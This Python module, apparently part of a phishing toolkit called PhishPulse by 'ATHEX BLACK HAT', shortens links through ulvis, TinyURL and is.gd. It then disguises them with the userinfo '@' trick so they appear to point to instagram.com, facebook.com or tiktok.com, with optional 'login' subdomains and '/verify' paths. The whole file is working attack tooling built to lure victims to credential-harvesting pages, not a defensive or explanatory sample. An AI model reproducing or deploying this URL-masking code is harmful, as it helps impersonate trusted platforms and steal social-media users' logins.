#!/usr/bin/env python3
"""
PhishPulse - URL Handler
Version: 1.0
Author: ATHEX BLACK HAT

Handles: URL Shortening, URL Masking
"""

import requests
import json
import re
from urllib.parse import urlparse, urlencode


def shorten_url(long_url, service='ulvis'):
    """
    Shorten a URL using various services
    
    Args:
        long_url: The long URL to shorten
        service: Service to use ('ulvis', 'tinyurl', 'isgd')
        
    Returns:
        str: Shortened URL or original URL if failed
    """
    services = {
        'ulvis': _shorten_ulvis,
        'tinyurl': _shorten_tinyurl,
        'isgd': _shorten_isgd,
    }
    
    handler = services.get(service, _shorten_ulvis)
    
    try:
        short_url = handler(long_url)
        if short_url:
            return short_url
    except:
        pass
    
    # If all services fail, return original
    return long_url

def _shorten_ulvis(long_url):
    """Shorten using ulvis.net"""
    api_url = "https://ulvis.net/API/write/post"
    
    response = requests.post(
        api_url,
        data={'url': long_url},
        timeout=10,
        headers={'User-Agent': 'Mozilla/5.0'}
    )
    
    if response.status_code == 200:
        try:
            data = response.json()
            if data.get('success'):
                return data.get('data', {}).get('url', long_url)
        except:
            pass
    
    return long_url

def _shorten_tinyurl(long_url):
    """Shorten using TinyURL"""
    api_url = f"https://tinyurl.com/api-create.php?url={long_url}"
    
    response = requests.get(api_url, timeout=10)
    
    if response.status_code == 200 and response.text:
        return response.text.strip()
    
    return long_url

def _shorten_isgd(long_url):
    """Shorten using is.gd"""
    api_url = f"https://is.gd/create.php?format=json&url={long_url}"
    
    response = requests.get(api_url, timeout=10)
    
    if response.status_code == 200:
        try:
            data = response.json()
            if 'shorturl' in data:
                return data['shorturl']
        except:
            pass
    
    return long_url



def mask_url(long_url, custom_domain=None, platform='instagram'):
    """
    Mask a URL to look like a legitimate platform URL
    
    Args:
        long_url: Original URL to mask
        custom_domain: Custom domain to use (optional)
        platform: Platform name for default domain
        
    Returns:
        str: Masked URL
    """
    # Default domains for each platform
    default_domains = {
        'instagram': 'instagram.com',
        'facebook': 'facebook.com',
        'tiktok': 'tiktok.com',
    }
    
    # Get domain to use
    domain = custom_domain or default_domains.get(platform, 'social-app.com')
    
    # Clean the domain
    domain = domain.strip().lower()
    domain = re.sub(r'^https?://', '', domain)
    domain = re.sub(r'^www\.', '', domain)
    domain = re.sub(r'/$', '', domain)
    
    # Shorten the URL first
    short_url = shorten_url(long_url)
    
    # Create masked URL
    if short_url.startswith('https://'):
        masked_url = short_url.replace('https://', f'https://{domain}@', 1)
    elif short_url.startswith('http://'):
        masked_url = short_url.replace('http://', f'http://{domain}@', 1)
    else:
        masked_url = f'https://{domain}@{short_url}'
    
    return masked_url

def mask_url_advanced(long_url, mask_config):
    """
    Advanced URL masking with multiple options
    
    Args:
        long_url: Original URL
        mask_config: Dictionary with masking options
            {
                'domain': 'custom-domain.com',
                'subdomain': 'login',
                'path': '/verify',
                'use_shortener': True,
                'shortener_service': 'ulvis'
            }
    
    Returns:
        str: Masked URL
    """
    domain = mask_config.get('domain', 'instagram.com')
    subdomain = mask_config.get('subdomain', '')
    path = mask_config.get('path', '')
    use_shortener = mask_config.get('use_shortener', True)
    shortener_service = mask_config.get('shortener_service', 'ulvis')
    
    # Build base domain
    if subdomain:
        full_domain = f"{subdomain}.{domain}"
    else:
        full_domain = domain
    
    # Shorten if needed
    if use_shortener:
        target_url = shorten_url(long_url, shortener_service)
    else:
        target_url = long_url
    
    # Build masked URL
    masked_url = f"https://{full_domain}@{target_url.replace('https://', '')}"
    
    if path:
        masked_url += f"/{path.lstrip('/')}"
    
    return masked_url


def is_valid_url(url):
    """Check if URL is valid"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def extract_real_url(masked_url):
    """
    Extract real URL from masked URL
    
    Args:
        masked_url: Masked URL
        
    Returns:
        str: Real URL
    """
    # Pattern: https://custom-domain@real-url.com/path
    pattern = r'https?://[^@]+@(.+)'
    match = re.search(pattern, masked_url)
    
    if match:
        real_url = match.group(1)
        if not real_url.startswith('http'):
            real_url = 'https://' + real_url
        return real_url
    
    return masked_url